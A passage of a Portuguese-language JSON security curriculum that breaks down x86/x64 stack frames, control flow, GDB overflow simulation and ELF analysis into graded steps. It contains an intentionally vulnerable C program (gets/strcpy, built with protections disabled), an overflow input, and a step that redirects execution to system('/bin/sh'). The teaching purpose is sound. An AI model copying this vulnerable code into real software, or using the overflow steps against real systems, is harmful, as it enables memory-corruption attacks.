                                    "Compilador GCC",
                                    "Ferramenta objdump ou IDA Free",
                                    "Exemplos de código C simples"
                                  ],
                                  "tips": "Use flags -S ou -g para gerar assembly legível com gcc.",
                                  "learningObjective": "Explicar como prologue/epílogo gerenciam stack frames para chamadas de função.",
                                  "commonMistakes": [
                                    "Confundir ebp com esp",
                                    "Ignorar alocação de espaço local no prologue",
                                    "Não considerar otimizações do compilador"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Passagem de Parâmetros e Valores de Retorno",
                                  "subSteps": [
                                    "Revise convenções de chamada (cdecl, stdcall, System V ABI).",
                                    "Trace parâmetros empilhados da direita para esquerda em x86.",
                                    "Estude uso de registradores para retornos (eax/rax) e parâmetros em x64.",
                                    "Examine como argumentos são acessados via [ebp + offset].",
                                    "Pratique desmontando funções com múltiplos parâmetros."
                                  ],
                                  "verification": "Desmonte uma função com 3 parâmetros e liste offsets na stack.",
                                  "estimatedTime": "1.5-2.5 horas",
                                  "materials": [
                                    "Objdump",
                                    "Exemplos C com funções variádicas",
                                    "Documentação ABI x86/x64"
                                  ],
                                  "tips": "Sempre verifique a convenção de chamada no início da análise.",
                                  "learningObjective": "Mapear parâmetros e retornos na stack e registradores durante execução.",
                                  "commonMistakes": [
                                    "Ordem errada de empilhamento",
                                    "Confundir caller vs callee cleanup",
                                    "Ignorar shadow space em x64"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Mecanismo de CALL, RET e Registradores EIP/RIP",
                                  "subSteps": [
                                    "Simule instrução CALL: push EIP; jmp func.",
                                    "Trace RET: pop EIP; ajuste ESP.",
                                    "Use debugger para observar mudanças em EIP/RIP, ESP/EBP.",
                                    "Analise impacto de interrupções ou exceções no fluxo.",
                                    "Diferencie 32-bit (EIP) vs 64-bit (RIP) comportamentos."
                                  ],
                                  "verification": "Execute um programa em debugger e capture stack trace antes/depois de CALL/RET.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Programa C com chamadas recursivas",
                                    "Diagrama de stack frame"
                                  ],
                                  "tips": "Use breakpoints em CALL/RET para pausar e inspecionar registradores.",
                                  "learningObjective": "Descrever precisamente como CALL/RET manipulam controle de fluxo via stack.",
                                  "commonMistakes": [
                                    "Pensar que CALL não salva EIP automaticamente",
                                    "Confundir RIP com endereço de retorno",
                                    "Não rastrear alinhamento da stack"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar Stack Frames e Pontos Vulneráveis a Ataques",
                                  "subSteps": [
                                    "Desenhe diagrama de stack frame: saved EBP, locals, params, return addr.",
                                    "Localize return address na stack e explique overflow para hijack.",
                                    "Analise ataques de controle de fluxo: ROP, ret2libc.",
                                    "Estude mitigações: ASLR, Canary, NX bit.",
                                    "Pratique identificando overflows em código desmontado."
                                  ],
                                  "verification": "Identifique 3 vulnerabilidades em um binário fornecido e proponha mitigações.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "GDB",
                                    "Binários vulneráveis (ex: damn-vulnerable-binaries)",
                                    "Documentação de exploits"
                                  ],
                                  "tips": "Foquem em offsets relativos a EBP para precisão.",
                                  "learningObjective": "Detectar pontos onde manipulação da stack permite controle de EIP/RIP.",
                                  "commonMistakes": [
                                    "Subestimar proteções modernas",
                                    "Confundir buffer local com parâmetros",
                                    "Ignorar prologue na contagem de offsets"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Prática Integrada com Análise em Debugger",
                                  "subSteps": [
                                    "Compile e debugue um programa C vulnerável a buffer overflow.",
                                    "Coloque breakpoints em prologue, CALL, RET e inspecione stack.",
                                    "Simule exploit alterando return address via input malicioso.",
                                    "Analise falhas de controle de fluxo em logs de debugger.",
                                    "Documente achados em relatório curto."
                                  ],
                                  "verification": "Produza screenshots e explicação de uma análise completa de exploit.",
                                  "estimatedTime": "2.5-3.5 horas",
                                  "materials": [
                                    "GDB/PEDA",
                                    "Código C vulnerável",
                                    "Python para payloads"
                                  ],
                                  "tips": "Instale PEDA ou GEF para GDB para visualização melhor da stack.",
                                  "learningObjective": "Aplicar conhecimentos para analisar e explorar chamadas/retornos em cenários reais.",
                                  "commonMistakes": [
                                    "Não desabilitar ASLR para testes iniciais",
                                    "Erros em payloads devido a null bytes",
                                    "Não validar com step-by-step execution"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile este código C vulnerável com gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln: #include <string.h> void vuln(char *input) { char buffer[64]; strcpy(buffer, input); } int main() { char input[100]; gets(input); vuln(input); } Use GDB: (gdb) run, inspecione stack em vuln(), envie payload >128 bytes para overflow return address e redirecione para system('/bin/sh').",
                              "finalVerifications": [
                                "Descreva verbalmente o fluxo completo de uma chamada de função, incluindo prologue/epílogo.",
                                "Desenhe e label um stack frame preciso com return address destacado.",
                                "Explique como um buffer overflow hijacka EIP/RIP.",
                                "Identifique mitigações e como contorná-las em testes.",
                                "Analise um binário real e liste 3 pontos vulneráveis.",
                                "Simule um exploit simples em debugger sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de registradores e stack operations (90%+ correto).",
                                "Capacidade de mapear offsets e identificar return address.",
                                "Detecção correta de vulnerabilidades de controle de fluxo.",
                                "Uso adequado de ferramentas como GDB para verificação.",
                                "Relatório claro com diagramas e evidências.",
                                "Compreensão de mitigações e impactos reais."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores, memória e pilha.",
                                "Programação em Linguagem C/Assembly: Convenções de chamada.",
                                "Engenharia Reversa: Análise estática/dinâmica de binários.",
                                "Análise de Malware: Dissecção de payloads de exploit.",
                                "Redes e Sistemas Operacionais: Contexto de execução em SOs."
                              ],
                              "realWorldApplication": "Em cibersegurança, essa análise é essencial para auditorias de binários, detecção de buffer overflows em software legado, desenvolvimento de exploits para pentests e implementação de proteções como stack canaries em compiladores, prevenindo ataques como ROP em servidores web e aplicações críticas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.2.3",
                            "name": "Entender execução sequencial e desvios",
                            "description": "Explicar semântica de instruções CPU (x86/x64): jumps condicionais, calls, ret, e como interrupções e signals alteram o fluxo, relacionando com análise de binários via ferramentas como objdump.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Execução Sequencial em x86/x64",
                                  "subSteps": [
                                    "Estude a arquitetura básica de CPU x86/x64: registradores EIP/RIP, fetch-decode-execute cycle.",
                                    "Analise instruções sequenciais como MOV, ADD, SUB e como o Instruction Pointer (IP) avança linearmente.",
                                    "Examine um assembly simples sem desvios usando objdump em um binário hello world.",
                                    "Trace o fluxo sequencial manualmente, anotando mudanças no IP após cada instrução.",
                                    "Compare execução sequencial com fluxos de alto nível em C para mapear conceitos."
                                  ],
                                  "verification": "Desmonte um binário simples com objdump e trace o IP sequencialmente sem erros em um diagrama.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Documentação Intel x86/x64 manuals (Vol. 2)",
                                    "GCC compiler",
                                    "objdump tool",
                                    "Binário de teste simples (ex: echo 'int main(){return 0;}' > test.c; gcc -o test test.c)"
                                  ],
                                  "tips": "Sempre verifique o modo (16/32/64-bit) com 'objdump -f binary'; use GDB para step-by-step se objdump for insuficiente.",
                                  "learningObjective": "Explicar como o IP avança linearmente em código sequencial e identificar instruções que não alteram o fluxo.",
                                  "commonMistakes": [
                                    "Confundir IP com registradores de dados",
                                    "Ignorar prefixos de tamanho de operando",
                                    "Não considerar alinhamento de instruções"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Jumps Condicionais e Incondicionais",
                                  "subSteps": [
                                    "Estude instruções JMP (incondicional), JE/JNE, JZ/JNZ, JG/JL baseadas em flags (ZF, CF, SF, OF).",
                                    "Disseque um binário com if-else em C usando objdump para mapear jumps.",
                                    "Simule execução: calcule alvos de jump (relativos/absolutos) e verifique flags pós-operações.",
                                    "Crie um diagrama de controle de fluxo (CFG) básico destacando desvios.",
                                    "Teste com GDB: defina breakpoints em jumps e observe condições de flags."
                                  ],
                                  "verification": "Explique e trace um loop while simples em assembly, prevendo saltos corretamente.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "Intel manuals (capítulos sobre Jcc instructions)",
                                    "objdump",
                                    "GDB debugger",
                                    "Código C com condicionais: if/while"
                                  ],
                                  "tips": "Lembre: jumps relativos usam deslocamento signed; use 'info reg flags' no GDB para inspecionar ZF/CF.",
                                  "learningObjective": "Prever e explicar desvios baseados em flags de condição em x86/x64.",
                                  "commonMistakes": [
                                    "Erro em cálculo de offset relativo",
                                    "Confundir flags pós-operadores lógicos vs aritméticos",
                                    "Ignorar jumps curtos vs near/far"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Calls, RET e Gerenciamento de Pilha",
                                  "subSteps": [
                                    "Analise CALL: push IP na stack e salta; RET: pop IP e retorna.",
                                    "Disseque uma função recursiva ou main() com calls aninhadas via objdump.",
                                    "Trace stack pointer (RSP/ESP): PUSH/POP em calls/rets.",
                                    "Identifique prologue/epilogue de funções e convenções de calling (System V vs Microsoft).",
                                    "Simule overflow de stack em calls profundas com GDB."
                                  ],
                                  "verification": "Desmonte uma função com calls múltiplas e reconstrua a pilha de chamadas corretamente.",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
                                    "Intel manuals (CALL/RET sections)",
                                    "objdump -d",
                                    "GDB",
                                    "Código C com funções recursivas"
                                  ],
                                  "tips": "Use 'x/10x $rsp' no GDB para dump da stack; note alinhamento 16-byte em x64.",
                                  "learningObjective": "Descrever como CALL/RET alteram fluxo via stack e identificar padrões de pilha.",
                                  "commonMistakes": [
                                    "Confundir CALL com JMP",
                                    "Esquecer shadow space em x64 Windows",
                                    "Não alinhar RSP em calls"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Investigar Interrupções e Signals no Fluxo de Execução",
                                  "subSteps": [
                                    "Estude INT n, IRET e Interrupt Descriptor Table (IDT); signals Unix (SIGINT, SIGSEGV).",
                                    "Analise handler de interrupção em kernel ou user-space via objdump.",
                                    "Simule signal com kill -SIGINT em processo e trace com strace/GDB.",
                                    "Mapeie como interrupções salvam contexto (push flags/reg/IP) e restauram.",
                                    "Relacione com análise de crashes/exploits em binários maliciosos."
                                  ],
                                  "verification": "Explique fluxo de uma INT 0x80 (syscall) e um signal handler em diagrama.",
                                  "estimatedTime": "55 minutes",
                                  "materials": [
                                    "Linux man pages (signal(7), int(2))",
                                    "objdump",
                                    "GDB",
                                    "strace",
                                    "Kernel docs on IDT"
                                  ],
                                  "tips": "Use 'strace ./binary' para ver syscalls/interrupts; foque em user-mode signals primeiro.",
                                  "learningObjective": "Explicar como interrupções/signals preemptem fluxo normal e restauram contexto.",
                                  "commonMistakes": [
                                    "Confundir hardware interrupts com software INT",
                                    "Ignorar privilege level (ring 0/3)",
                                    "Não considerar async nature de signals"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar Conceitos na Análise de Binários com Objdump",
                                  "subSteps": [
                                    "Compile C com -O0 e -S para assembly; disseque com objdump -d -M intel.",
                                    "Construa CFG completo identificando sequencial/jumps/calls/interrupts.",
                                    "Simule execução full com paper tracing ou Ghidra/IDA free.",
                                    "Identifique anomalias: jumps obfuscados, calls indiretos.",
                                    "Aplique a malware sample simples (ex: EICAR test ou crackme)."
                                  ],
                                  "verification": "Analise um binário real e produza relatório de fluxo com desvios mapeados.",
                                  "estimatedTime": "75 minutes",
                                  "materials": [
                                    "objdump",
                                    "Ghidra ou radare2",
                                    "Sample binários (crackmes.one)",
                                    "C compiler com -S flag"
                                  ],
                                  "tips": "Opção -M intel para syntax legível; combine com 'readelf -h' para headers.",
                                  "learningObjective": "Aplicar semântica de fluxo na reversão prática de binários x86/x64.",
                                  "commonMistakes": [
                                    "Não decodificar corretamente dados como código",
                                    "Perder calls dinâmicos",
                                    "Ignorar relocações em PIE"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main() { if (x > 0) { func(); } }' com gcc -O0 -no-pie -o test test.c. Use objdump -d test | grep -A20 main: para mapear jumps (jg), call, ret. Trace IP: sequencial até cmp, jump se ZF=0, call push/ret pop. Simule SIGINT com Ctrl+C e observe handler preemptivo.",
                              "finalVerifications": [
                                "Trace corretamente fluxo de um binário com 5+ jumps/calls sem erros.",
                                "Explique impacto de uma interrupção em meio a jumps condicionais.",
                                "Gere CFG de um binário real usando objdump output.",
                                "Identifique e corrija 3 erros comuns em análise de fluxo.",
                                "Relacione desvios com vulnerabilidade ROP básica.",
                                "Simule execução em GDB incluindo signal handling."
                              ],
                              "assessmentCriteria": [
                                "Precisão na previsão de IP pós-instruções (90%+ acerto em traces).",
                                "Compreensão profunda de flags e condições de jump (explicação sem gaps).",
                                "Habilidade em gerar CFGs legíveis de objdump output.",
                                "Integração correta de interrupts/signals no fluxo geral.",
                                "Aplicação prática em binário não-trivial sem ferramentas GUI.",
                                "Identificação de 80%+ de anomalias em sample obfuscado."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly (NASM/GAS para hands-on).",
                                "Sistemas Operacionais (handlers de signals/IDT em Linux/Windows).",
                                "Engenharia Reversa (Ghidra/IDA para CFGs avançados).",
                                "Análise de Malware (fluxo em samples reais).",
                                "Arquitetura de Computadores (pipeline, branch prediction)."
                              ],
                              "realWorldApplication": "Em cibersegurança, entender desvios permite análise de malware (ex: jumps condicionais em anti-debugging), detecção de ROP chains em exploits (calls/rets manipulados), e debugging de crashes (interrupts/signals em faults), essencial para ferramentas como IDA Pro em incident response."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.2.4",
                            "name": "Simular execução vulnerável em memória",
                            "description": "Usar debuggers como GDB para observar carregamento de binário, alocação de stack/heap e execução passo a passo, simulando cenários de overflow para entender semântica.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar um programa C vulnerável a overflow",
                                  "subSteps": [
                                    "Escreva um programa C simples com uma função que usa strcpy em um buffer pequeno (ex: char buf[64]; strcpy(buf, argv[1]);)",
                                    "Inclua uma função main que chama essa função vulnerável",
                                    "Adicione prints ou variáveis globais para rastrear o endereço de retorno",
                                    "Compile o código sem proteções ASLR ou stack canary usando flags como gcc -fno-stack-protector -z execstack -no-pie",
                                    "Teste a execução normal com input curto para confirmar funcionamento"
                                  ],
                                  "verification": "Execute o binário com input válido e confirme que não há crash; verifique se o binário foi gerado sem proteções via file ou checksec",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code ou vim)",
                                    "Compilador GCC",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use #include <string.h> para strcpy; mantenha o código minimalista para foco na vulnerabilidade",
                                  "learningObjective": "Entender como criar um binário intencionalmente vulnerável para simulação controlada",
                                  "commonMistakes": [
                                    "Esquecer flags de compilação, resultando em proteções ativas",
                                    "Usar input muito longo no teste inicial causando crash prematuro"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Iniciar e configurar o GDB para depuração",
                                  "subSteps": [
                                    "Execute gdb ./programa_vulneravel",
                                    "Defina breakpoints na função vulnerável (break funcao_vuln) e no main",
                                    "Use info registers e info stack para observar registradores e stack inicial",
                                    "Execute run com input curto para parar no breakpoint",
                                    "Examine o layout da stack com x/20x $rsp ou disas para ver o código"
                                  ],
                                  "verification": "Confirme que o GDB carrega o binário e breakpoints são atingidos; stack e heap são visíveis via comandos info",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GDB instalado",
                                    "Binário vulnerável gerado no step 1"
                                  ],
                                  "tips": "Use layout asm no GDB para visualização assembly; set disassembly-flavor intel para sintaxe familiar",
                                  "learningObjective": "Dominar inicialização do GDB e inspeção inicial de memória e registradores",
                                  "commonMistakes": [
                                    "Não definir breakpoints, perdendo controle da execução",
                                    "Confundir $rsp com $rbp no x86-64"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Observar carregamento, alocação e execução passo a passo",
                                  "subSteps": [
                                    "Use nexti ou stepi para avançar instrução por instrução na alocação do buffer",
                                    "Monitore stack com x/32gx $rsp antes/depois da alocação local",
                                    "Observe heap se aplicável com info proc mappings e x/<endereço>",
                                    "Examine registradores como $rsp, $rbp durante chamadas de função",
                                    "Continue até strcpy e anote mudanças na stack com watch *(char*)($rsp + offset)"
                                  ],
                                  "verification": "Registre screenshots ou notas mostrando stack antes/depois alocação; confirme crescimento do stack frame",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB session ativa",
                                    "Notas ou screenshots para documentação"
                                  ],
                                  "tips": "Use tui enable para interface gráfica; comandos como bt para backtrace",
                                  "learningObjective": "Visualizar dinamicamente alocação stack/heap e fluxo de execução em assembly",
                                  "commonMistakes": [
                                    "Avançar rápido com 'next' em vez de 'stepi', perdendo detalhes assembly",
                                    "Ignorar ASLR; desative com set disable-randomization on"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular cenário de overflow e analisar semântica",
                                  "subSteps": [
                                    "Reinicie GDB e execute com input longo (ex: python -c 'print(\"A\"*100)' )",
                                    "Passe pelo breakpoint e use stepi até strcpy overflow",
                                    "Observe sobrescrita do endereço de retorno via x/$rsp",
                                    "Continue execução e capture o crash (segmentation fault)",
                                    "Analise core dump com gdb ./programa core para postmortem"
                                  ],
                                  "verification": "Confirme sobrescrita do RIP/EIP e crash; explique em palavras o que aconteceu",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Input malicioso gerado",
                                    "GDB com suporte a core dumps (ulimit -c unlimited)"
                                  ],
                                  "tips": "Use pattern_create.rb do Metasploit para inputs precisos; examine $pc no crash",
                                  "learningObjective": "Compreender semântica de overflow: sobrescrita de controle e exploração",
                                  "commonMistakes": [
                                    "Input não longo o suficiente",
                                    "Não capturar core dump para análise detalhada"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e refletir sobre proteções e mitigações",
                                  "subSteps": [
                                    "Recompile com proteções (gcc -fstack-protector) e repita simulação",
                                    "Observe canary falhando ou ASLR randomizando endereços",
                                    "Compare execuções vulnerável vs protegida",
                                    "Anote diferenças na semântica de execução",
                                    "Crie um relatório resumindo observações"
                                  ],
                                  "verification": "Relatório compara cenários e explica por que proteções bloqueiam",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Compilações com/sem proteções",
                                    "Editor para relatório"
                                  ],
                                  "tips": "Use checksec.sh para verificar proteções no binário",
                                  "learningObjective": "Entender impacto de mitigações modernas na semântica vulnerável",
                                  "commonMistakes": [
                                    "Não recompilar corretamente, mantendo proteções ausentes"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile e depure um programa C com buffer de 64 bytes usando strcpy( buf, argv[1] ). No GDB, input 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' causa overflow, sobrescrita do saved RIP, e jump para endereço inválido, demonstrando controle de fluxo perdido.",
                              "finalVerifications": [
                                "Pode executar GDB passo a passo e descrever mudanças na stack em tempo real",
                                "Identifica endereço de retorno sobrescrito durante overflow",
                                "Explica diferença entre stack e heap na alocação observada",
                                "Simula overflow sem crash prematuro e captura core dump",
                                "Compara execução com proteções ativadas vs desativadas",
                                "Documenta layout de stack frame corretamente (locais, saved rbp, rip)"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de alocações stack/heap (90%+ acurácia)",
                                "Uso correto de comandos GDB (stepi, x/, watch, info registers)",
                                "Análise correta de overflow: sobrescrita comprovada via memória dump",
                                "Relatório claro com screenshots e explicações semânticas",
                                "Compreensão de mitigações: explica ASLR, canary, NX em contexto",
                                "Tempo de execução dentro de estimados com maestria demonstrada"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Manipulação de strings e ponteiros",
                                "Arquitetura de Computadores: Stack frames, calling conventions x86-64",
                                "Sistemas Operacionais: Gerenciamento de memória virtual e ASLR",
                                "Engenharia Reversa: Uso de debuggers em binários",
                                "Análise de Malware: Técnicas similares para dissecar exploits"
                              ],
                              "realWorldApplication": "Em pentesting e análise de vulnerabilidades, simular overflows em GDB permite validar CVEs como buffer overflows em serviços reais (ex: Heartbleed-like), treinar detecção em ferramentas como AFL fuzzers, e desenvolver exploits éticos para relatórios de segurança."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.2",
                    "name": "Análise de Binários",
                    "description": "Técnicas para disassemblar e inspecionar executáveis em busca de vulnerabilidades.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.2.1",
                        "name": "Formatos de Executáveis",
                        "description": "Compreensão das estruturas básicas de arquivos executáveis, como ELF (Linux) e PE (Windows), essenciais para iniciar a análise de binários.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.1.1",
                            "name": "Identificar o formato de um binário",
                            "description": "Usar comandos como 'file' e 'readelf' para determinar o tipo de executável, arquitetura e informações básicas de cabeçalho.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de análise",
                                  "subSteps": [
                                    "Instale o pacote binutils se não estiver presente: sudo apt update && sudo apt install binutils no Ubuntu/Debian.",
                                    "Baixe ou localize um binário de exemplo, como /bin/ls ou baixe um executável simples de um repositório confiável.",
                                    "Abra um terminal Linux (preferencialmente Ubuntu ou distribuição similar).",
                                    "Verifique se os comandos 'file' e 'readelf' estão disponíveis executando 'file --version' e 'readelf --version'."
                                  ],
                                  "verification": "Os comandos 'file' e 'readelf' executam sem erros e mostram versões.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Máquina Linux (VM ou nativa), acesso root/sudo, binário de teste (/bin/ls)",
                                  "tips": "Use uma VM isolada para segurança ao testar binários desconhecidos.",
                                  "learningObjective": "Preparar um ambiente seguro e funcional para análise de binários.",
                                  "commonMistakes": "Executar sem sudo quando necessário; testar binários maliciosos sem isolamento."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar tipo básico com comando 'file'",
                                  "subSteps": [
                                    "Execute 'file nome_do_binario' (ex: file /bin/ls).",
                                    "Analise a saída: procure por 'ELF', 'PE', 'Mach-O', etc., e detalhes como '64-bit', 'executable'.",
                                    "Note arquitetura (LSB para little-endian x86_64, etc.) e tipo (shared object, executable).",
                                    "Repita com um binário Windows (PE) se disponível para comparação.",
                                    "Registre a saída em um arquivo de notas: file_output.txt."
                                  ],
                                  "verification": "Saída do 'file' é interpretada corretamente, identificando formato (ex: ELF 64-bit).",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Terminal Linux, binário de teste",
                                  "tips": "O 'file' usa magic numbers; é rápido e não requer privilégios especiais.",
                                  "learningObjective": "Dominar o uso do 'file' para detecção rápida de formato e arquitetura.",
                                  "commonMistakes": "Ignorar flags como 'pie' ou 'stripped'; confundir saída com análise profunda."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar cabeçalho com 'readelf'",
                                  "subSteps": [
                                    "Execute 'readelf -h nome_do_binario' para cabeçalho ELF.",
                                    "Identifique campos chave: Magic (7f ELF), Class (ELF64), Data (2's complement little-endian), Version, OS/ABI, Entry point.",
                                    "Use 'readelf --file-header nome_do_binario' para resumo similar.",
                                    "Para seções: 'readelf -S nome_do_binario'; para símbolos: 'readelf -s nome_do_binario'.",
                                    "Compare com documentação ELF (man elf)."
                                  ],
                                  "verification": "Cabeçalho ELF é corretamente descrito, incluindo magic number e entry point.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Terminal, binário ELF de teste",
                                  "tips": "'readelf -a' dá visão completa; use '--wide' para saídas longas.",
                                  "learningObjective": "Extrair e interpretar informações detalhadas do cabeçalho ELF.",
                                  "commonMistakes": "Assumir todos binários são ELF; ignorar erros em não-ELF (use 'readelf -h' com cuidado)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar informações e validar identificação",
                                  "subSteps": [
                                    "Combine saídas de 'file' e 'readelf': confirme formato, arch, tipo.",
                                    "Teste com binários variados: ELF32, PE (use 'file' só), Mach-O.",
                                    "Simule relatório: 'Formato: ELF64, Arch: x86_64, Executável dinâmico'.",
                                    "Use 'objdump -f' como verificação cruzada.",
                                    "Documente em relatório curto."
                                  ],
                                  "verification": "Relatório sintetiza corretamente formato/arch para 3+ binários.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Múltiplos binários de teste",
                                  "tips": "Pratique com binários cross-plataforma para reforçar diferenças.",
                                  "learningObjective": "Integrar ferramentas para identificação completa de binários.",
                                  "commonMistakes": "Confiar só em uma ferramenta; não testar edge cases como static vs dynamic."
                                }
                              ],
                              "practicalExample": "Analise /bin/ls: 'file /bin/ls' retorna 'ELF 64-bit LSB pie executable, x86-64'; 'readelf -h /bin/ls' mostra Magic: 7f 45 4c 46, Entry point: 0x1138, confirmando ELF64 x86_64.",
                              "finalVerifications": [
                                "Identifica corretamente ELF vs PE vs outros formatos.",
                                "Extrai arquitetura (x86_64, ARM) com precisão.",
                                "Localiza entry point e OS/ABI do cabeçalho.",
                                "Diferencia executable, shared lib, core dump.",
                                "Valida com pelo menos 3 binários diferentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de 'file' (90%+ correto).",
                                "Detalhes corretos do cabeçalho 'readelf -h' (magic, class, entry).",
                                "Relatório claro e estruturado.",
                                "Tratamento de erros para binários inválidos.",
                                "Tempo eficiente sem erros graves."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender loaders e formatos de executáveis.",
                                "Programação em C/Assembly: Relacionar com linking e ABI.",
                                "Redes/Forense Digital: Análise de malware em binários capturados.",
                                "Matemática: Endianness e representação binária."
                              ],
                              "realWorldApplication": "Em cibersegurança, identificar formatos de binários suspeitos em incidentes de malware, reverse engineering para vulnerabilidades, ou auditoria de software em ambientes mistos (Linux/Windows)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.2",
                            "name": "Explorar seções e cabeçalhos ELF",
                            "description": "Analisar seções como .text, .data e .bss usando ferramentas como readelf e objdump para entender a organização do binário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura básica do formato ELF",
                                  "subSteps": [
                                    "Estude a documentação oficial do ELF, focando em cabeçalhos (ELF Header, Program Header, Section Header).",
                                    "Identifique seções principais: .text (código executável), .data (dados inicializados), .bss (dados não inicializados).",
                                    "Revise conceitos de linkers e loaders para contextualizar a organização do binário.",
                                    "Crie um diagrama mental ou desenhe a layout típico de um arquivo ELF.",
                                    "Compare ELF com outros formatos como PE para Windows."
                                  ],
                                  "verification": "Desenhe um diagrama da estrutura ELF e explique verbalmente ou por escrito as funções de cada seção principal.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação ELF (man elf ou online), editor de texto para notas, papel/caneta para diagrama.",
                                  "tips": "Use imagens visuais da web para auxiliar na compreensão inicial.",
                                  "learningObjective": "Dominar os conceitos fundamentais das seções e cabeçalhos ELF antes da análise prática.",
                                  "commonMistakes": "Confundir Program Headers (para carregamento) com Section Headers (para linking); ignorar endianness e arquitetura."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar ferramentas e examinar com readelf",
                                  "subSteps": [
                                    "Instale binutils no Linux (ex: sudo apt install binutils).",
                                    "Execute 'readelf -h arquivo.elf' para ver o ELF Header.",
                                    "Use 'readelf -S arquivo.elf' para listar todas as seções e seus tamanhos/endereços.",
                                    "Identifique e anote .text, .data e .bss nas saídas.",
                                    "Execute 'readelf -l arquivo.elf' para Program Headers."
                                  ],
                                  "verification": "Gere saídas de readelf para um binário sample e rotule manualmente as seções principais em um relatório.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Terminal Linux, binário ELF sample (ex: /bin/ls ou compile um 'hello world' com gcc).",
                                  "tips": "Use um binário estático para simplicidade inicial (gcc -static hello.c -o hello).",
                                  "learningObjective": "Aprender a usar readelf para extrair metadados de cabeçalhos e seções ELF.",
                                  "commonMistakes": "Executar readelf em binários não-ELF (ex: Windows EXE); ignorar flags como -W para warnings."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar seções detalhadamente com objdump",
                                  "subSteps": [
                                    "Execute 'objdump -h arquivo.elf' para headers de seções com permissões (rwx).",
                                    "Dump conteúdo: 'objdump -d .text arquivo.elf' para desassembly do código.",
                                    "Examine 'objdump -s -j .data arquivo.elf' para hex dump de dados.",
                                    "Analise .bss: note que é zero-filled em runtime, verifique tamanho com readelf.",
                                    "Compare saídas de readelf e objdump para validação cruzada."
                                  ],
                                  "verification": "Produza dumps de .text, .data e .bss de um binário e interprete 3 funções ou variáveis chave.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Terminal Linux, mesmo binário ELF sample, objdump (incluído em binutils).",
                                  "tips": "Pipe output para less ou arquivo: objdump ... | less para navegação fácil.",
                                  "learningObjective": "Habilitar análise profunda de conteúdo e permissões de seções ELF usando objdump.",
                                  "commonMistakes": "Confundir offsets virtuais com arquivos; não notar permissões (ex: .text é r-x)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e sintetizar a organização do binário",
                                  "subSteps": [
                                    "Mapeie seções para memória runtime: .text em código, .data/.bss em heap/stack.",
